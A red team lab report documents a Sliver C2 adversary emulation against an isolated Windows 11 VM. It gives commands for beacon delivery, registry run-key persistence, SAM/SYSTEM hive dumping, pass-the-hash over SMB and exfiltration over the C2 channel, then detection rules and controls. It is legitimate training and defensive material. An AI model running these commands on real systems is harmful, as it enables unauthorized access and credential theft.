# Red Team Assessment Report
## CASE-24: Sliver C2 Adversary Emulation Lab

**Classification:** Simulated / Educational Lab  
**Assessment Date:** 2026-09-17  
**Prepared by:** Ronan Kongala  
**Environment:** Isolated VMware NAT network (192.168.93.x)  
**Attacker:** REMnux 192.168.93.137  
**Victim:** Windows 11 Enterprise (90-day eval) -- DESKTOP-6BNHCTQ, 192.168.93.138  
**C2 Framework:** Sliver v1.7.7  

---

## 1. Executive Summary

This report documents an adversary emulation exercise against a Windows 11 Enterprise target in a self-contained VMware lab. The goal was to simulate a threat actor progressing from initial access through persistence, credential access, lateral movement, and exfiltration using the Sliver C2 framework, and to author detection rules against the resulting activity.

An HTTPS beacon compiled for windows/amd64 with symbol obfuscation was delivered to the victim via HTTP and executed. The beacon established a C2 channel back to REMnux on port 443, surviving a reboot via a registry run key. Privilege escalation was attempted using Sliver's getsystem and PrintSpoofer64, with SeImpersonatePrivilege and a running Spooler service confirmed -- but no SYSTEM session materialized. The subsequent credential dump and lateral movement steps ran from an administrator-level session. SAM and SYSTEM registry hives were exfiltrated via the C2 channel and parsed offline with pypykatz, yielding five local account NTLM hashes. The Victim account hash was used for a successful pass-the-hash SMB authentication against the same machine. A staged file was exfiltrated over the HTTPS beacon channel.

**Techniques executed:** 6 fully completed, 1 attempted (privilege escalation)  
**Accounts compromised:** 5 local accounts (NTLM hashes)  
**Persistence established:** 1 registry run key  
**Privilege level during operations:** Local administrator (SYSTEM not achieved)  
**Detection rules authored:** 3 Sigma rules  

---

## 2. Assessment Scope and Rules of Engagement

| Parameter | Value |
|---|---|
| Scope | Single Windows 11 Enterprise VM on isolated VMware NAT subnet |
| Out of scope | Host machine, internet, production systems |
| Network | 192.168.93.x VMware NAT only |
| Authorization | Self-authorized lab environment -- no production systems involved |
| Constraints | No destructive payloads; no credential exfiltration beyond VM boundary |
| Objectives | Execute ATT&CK kill chain, document techniques, author detection rules |

---

## 3. Attack Narrative

### Phase 1 -- Initial Access and C2 Establishment

**Technique:** T1204.002 -- User Execution: Malicious File  
**Technique:** T1071.001 -- Application Layer Protocol: Web Protocols

A Sliver HTTPS beacon (`case24-beacon.exe`) was compiled on REMnux for the windows/amd64 target with symbol obfuscation enabled. Build time was 4m11s. The beacon was served from REMnux at `http://192.168.93.137:8080/` via Python's built-in HTTP server and downloaded to the victim desktop using PowerShell:

```powershell
Invoke-WebRequest -Uri http://192.168.93.137:8080/case24-beacon.exe -OutFile C:\Users\victim\Desktop\case24-beacon.exe
```

Upon execution, the beacon established an encrypted HTTPS callback to the Sliver listener at `192.168.93.137:443` (job #1) with a 60-second beacon interval.

**Evidence:**
- Sliver console: `Beacon d4bea7db case24-beacon -- 192.168.93.138:55723 (DESKTOP-6BNHCTQ) -- windows/amd64 -- Thu 17 Sep 2026 04:52:02 UTC`
- Beacon session ID: `d4bea7db-edb2-41c3-9a18-edcec35697bd`
- Screenshot: `07_beacon_connecting.png`

---

### Phase 2 -- Persistence

**Technique:** T1547.001 -- Boot or Logon Autostart Execution: Registry Run Keys

From the active Sliver beacon session, a registry run key was written to maintain access across reboots. No elevated privileges were required for the HKCU key path.

**Command executed (Sliver console):**
```
registry write --hive HKCU --type string "Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater" "C:\\Users\\victim\\Desktop\\case24-beacon.exe"
```

**Registry artifact:**
- Hive: `HKEY_CURRENT_USER`
- Key: `Software\Microsoft\Windows\CurrentVersion\Run`
- Value name: `Updater`
- Data: `C:\Users\victim\Desktop\case24-beacon.exe`

Confirmed in Registry Editor (regedit) on the victim. The key was visible alongside legitimate entries (MicrosoftEdgeAutoLaunch, OneDrive).

**Evidence:**
- Sliver task completion: `[*] Value written to registry`
- Screenshot: `08_persistence_registry.png`

---

### Phase 3 -- Privilege Escalation (Attempted)

**Technique:** T1134.001 -- Access Token Manipulation: Token Impersonation/Theft  
**Status:** Attempted -- SYSTEM not achieved

An interactive Sliver session was spawned from the beacon (session ID: `8fee46e1-d65e-41d9-b37f-6a11bd96f708`) to access commands unavailable in beacon mode. The `getsystem` command was issued, which uses named pipe token impersonation:

```
[127.0.0.1] sliver (case24-beacon) > getsystem
[*] A new SYSTEM session should pop soon...
```

No SYSTEM session appeared after several minutes. PrintSpoofer64.exe was downloaded to `C:\Windows\Temp\PrintSpoofer64.exe` and executed from the shell. Both the Print Spooler service (confirmed running, PID 9xxxx) and `SeImpersonatePrivilege` (confirmed Enabled in `whoami /priv` output) met the prerequisites for the attack, but PrintSpoofer produced no output. The attack is assessed to have failed due to Windows 11 runtime controls on the interactive desktop session token.

All subsequent phases were conducted from the administrator-level Victim account, not SYSTEM.

**Evidence:**
- `whoami /priv` output showing SeImpersonatePrivilege: Enabled
- `sc query Spooler` output showing STATE: 4 RUNNING

---

### Phase 4 -- Credential Access

**Technique:** T1003.002 -- OS Credential Dumping: Security Account Manager

With administrator rights, the SAM and SYSTEM registry hives were saved to disk using the built-in `reg.exe`:

```
execute -o "reg.exe" "save" "HKLM\\SAM" "C:\\Windows\\Temp\\sam.hiv"
execute -o "reg.exe" "save" "HKLM\\SYSTEM" "C:\\Windows\\Temp\\system.hiv"
```

Both files were downloaded to REMnux via the Sliver `download` command:

```
download C:\\Windows\\Temp\\sam.hiv /tmp/sam.hiv      (45,056 bytes)
download C:\\Windows\\Temp\\system.hiv /tmp/system.hiv (12,791,808 bytes)
```

pypykatz was used to parse the hives offline on REMnux:

```bash
pypykatz registry --sam /tmp/sam.hiv /tmp/system.hiv
```

**Hashes extracted (NTLM, actual values redacted):**

| Account | RID | Hash |
|---|---|---|
| Administrator | 500 | [redacted -- empty password hash] |
| Guest | 501 | [redacted -- empty password hash] |
| DefaultAccount | 503 | [redacted -- empty password hash] |
| WDAGUtilityAccount | 504 | [redacted] |
| Victim | 1001 | [redacted] |

Boot Key and HBoot Key were also recovered.

Note: Mimikatz was unavailable -- Defender quarantined the binary immediately on transfer despite real-time protection being toggled off via the GUI. The SAM hive approach (T1003.002) does not require LSASS access and succeeded without elevated privileges beyond local administrator.

**Evidence:**
- Screenshot: `10_sam_dump.png` (Sliver download confirmations)
- Screenshot: `11_credential_dump.png` (pypykatz output with hashes)

---

### Phase 5 -- Lateral Movement

**Technique:** T1550.002 -- Use Alternate Authentication Material: Pass the Hash

The Victim account's NTLM hash was used to authenticate to the victim machine itself via SMB using impacket's smbclient:

```bash
python3 /home/remnux/.local/bin/smbclient.py \
  -hashes aad3b435b51404eeaad3b435b51404ee:[VICTIM_NTLM_HASH] \
  Victim@192.168.93.138
```

Authentication succeeded. Available shares were enumerated:

| Share | Type |
|---|---|
| ADMIN$ | DISK (SPECIAL) -- Remote Admin |
| C$ | DISK (SPECIAL) -- Default share |
| IPC$ | IPC (SPECIAL) -- Remote IPC |

Attempting `use C$` returned STATUS_ACCESS_DENIED, consistent with a non-elevated Victim account lacking admin share write access. Authentication and enumeration were successful; write access was not expected.

**Evidence:**
- Screenshot: `12_pass_the_hash.png`

---

### Phase 6 -- Exfiltration

**Technique:** T1041 -- Exfiltration Over C2 Channel

A file containing simulated sensitive data was staged on the victim and transferred to REMnux over the existing HTTPS beacon channel:

**Staging (via Sliver shell):**
```
execute -o "cmd.exe" "/c" "echo Victim-Credentials: password123 > C:\\Windows\\Temp\\sensitive.txt"
```

**Exfiltration (Sliver console):**
```
download C:\\Windows\\Temp\\sensitive.txt /tmp/exfil_sensitive.txt
```

**Result:** 34 bytes received at `/tmp/exfil_sensitive.txt` on REMnux.

**Evidence:**
- Screenshot: `13_exfiltration.png`

---

## 4. Technical Findings Summary

| # | Technique ID | Technique | Tactic | Status | Evidence |
|---|---|---|---|---|---|
| 1 | T1204.002 | User Execution: Malicious File | Execution | Completed | Beacon d4bea7db, screenshot 07 |
| 2 | T1071.001 | Application Layer Protocol: Web Protocols | C2 | Completed | HTTPS listener job #1, 60s interval |
| 3 | T1547.001 | Registry Run Keys | Persistence | Completed | Updater key in regedit, screenshot 08 |
| 4 | T1134.001 | Token Impersonation | Privilege Escalation | Attempted | SeImpersonatePrivilege confirmed, SYSTEM not achieved |
| 5 | T1003.002 | Security Account Manager | Credential Access | Completed | 5 accounts, pypykatz output, screenshot 11 |
| 6 | T1550.002 | Pass the Hash | Lateral Movement | Completed | SMB auth, shares enumerated, screenshot 12 |
| 7 | T1041 | Exfiltration Over C2 Channel | Exfiltration | Completed | 34 bytes, screenshot 13 |

---

## 5. Detection Recommendations

### Sigma Rules Authored

Three Sigma rules were written against this activity and are in `sigma-rules/sigma-rules.md`:

| Rule | Targets | Data Source |
|---|---|---|
| Sliver C2 HTTPS Beacon | Non-browser process making periodic HTTPS connections | Sysmon EventID 3 |
| Registry Run Key Persistence | Writes to CurrentVersion\Run by non-standard images | Sysmon EventID 13 |
| LSASS Memory Access | PROCESS_VM_READ access to lsass.exe (detection target even though LSASS was not accessed in this lab) | Sysmon EventID 10 |

### Host-Based Controls

| Control | Rationale |
|---|---|
| AppLocker / WDAC policy | Block execution of unsigned binaries from user-writable paths (Desktop, Downloads, Temp) |
| Credential Guard | Prevents LSASS-based credential dumping even from SYSTEM; would not have blocked SAM hive dump |
| VSS / SAM hive access auditing | Audit and alert on reg.exe saving HKLM\SAM or HKLM\SYSTEM |
| EDR LSASS protection | Restrict PROCESS_VM_READ access to lsass.exe to allowlisted security products |

### Network-Based Controls

| Control | Rationale |
|---|---|
| TLS inspection at proxy | Sliver's HTTPS C2 uses a self-signed certificate; SSL inspection would flag unknown CA |
| Network flow timing analysis | 60-second beacon interval produces low-variance, regular outbound connections distinguishable from browser traffic |
| Block outbound 443 to non-CDN IPs | 192.168.93.137 would not resolve to a known CDN -- unusual for port 443 traffic |
| SMB lateral movement detection | Alert on SMB authentication from unexpected source IPs, particularly pass-the-hash indicators (NTLM auth with no Kerberos fallback) |

---

## 6. ATT&CK Coverage

Layer file: `attck-navigator/attck-navigator-layer.json`  
Import at: https://mitre-attack.github.io/attack-navigator/  

Tactics covered: Execution, Command and Control, Persistence, Privilege Escalation (attempted), Credential Access, Lateral Movement, Exfiltration

---

## 7. Observations and Lessons

**What worked:**
- Sliver HTTPS beacon compiled and delivered cleanly. Symbol obfuscation prevented signature-based detection of the binary during transfer.
- Registry persistence survived the session and would survive a reboot.
- SAM hive exfiltration via reg.exe is reliable at admin level without triggering LSASS access alerts. pypykatz parses offline with no additional tooling on the victim.
- Pass-the-hash via impacket requires no additional tooling installation on the attacker.

**What didn't work:**
- getsystem via named pipe impersonation failed despite prerequisites being met. Windows 11's Session 0 isolation and desktop token restrictions are more aggressive than earlier OS versions.
- PrintSpoofer64.exe was quarantined by Defender on the Desktop and failed silently from Temp -- Defender's behavioral detection fires even with real-time protection toggled off via the GUI. A pre-compiled tool from a known public release triggers immediate quarantine. A custom or obfuscated build would be required in a real engagement.
- Mimikatz was quarantined instantly.

**Defensive insight:**
A standard user account with no AV exclusions configured would have stopped the kill chain at the credential dump phase. The lab proceeded because Defender was partially disabled. In a hardened environment with Credential Guard and LSASS protections enabled, the SAM hive approach would still work -- reg.exe saving HKLM\SAM is a native binary action that EDR products frequently miss if SAM hive access auditing is not explicitly enabled.

---

## 8. Conclusion

A single HTTPS beacon delivered via HTTP to a partially hardened Windows 11 host was sufficient to establish persistence, dump local credentials, and authenticate laterally via pass-the-hash -- all without achieving SYSTEM. The most significant defensive gap demonstrated is that admin-level access plus reg.exe is enough to extract all local account hashes with no LSASS access required. Credential Guard addresses this; SAM hive access auditing detects it. Neither was active in this lab environment.

All activity was performed in an isolated VMware NAT environment. No production systems, real credentials, or internet connectivity were involved.

---

*Report generated: 2026-09-17 | CASE-24 | github.com/ronankongala/red-team-c2-lab*
